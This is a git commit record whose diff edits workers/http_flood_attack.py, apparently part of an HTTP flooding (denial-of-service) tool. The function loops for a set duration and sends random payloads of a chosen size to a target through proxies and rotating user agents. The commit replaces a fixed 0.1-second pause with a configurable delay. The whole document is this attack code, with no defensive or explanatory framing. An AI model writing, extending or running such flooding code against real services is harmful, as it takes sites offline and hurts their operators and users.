f3e5bdf8e658aeddf728d7cc25d4c8cf460e2209
Sakuzuna <nikita.kopychev@s.wingateschool.com>
2025-02-26 00:36:10 +0000

    Update http_flood_attack.py

--- workers/http_flood_attack.py
+++ workers/http_flood_attack.py
@@ -2,10 +2,10 @@ import time
 from utils.http_bot import HTTPBot
 from utils.random_utils import random_string
 
-def http_flood_attack(target, proxies, user_agents, duration, packet_size):
+def http_flood_attack(target, proxies, user_agents, duration, packet_size, packet_delay):
     bot = HTTPBot(proxies, user_agents)
     end_time = time.time() + duration
     while time.time() < end_time:
-        payload = random_string(packet_size * 1024)  
+        payload = random_string(packet_size * 1024) 
         bot.send_request(target, payload)
-        time.sleep(0.1)  
+        time.sleep(packet_delay / 1000)  
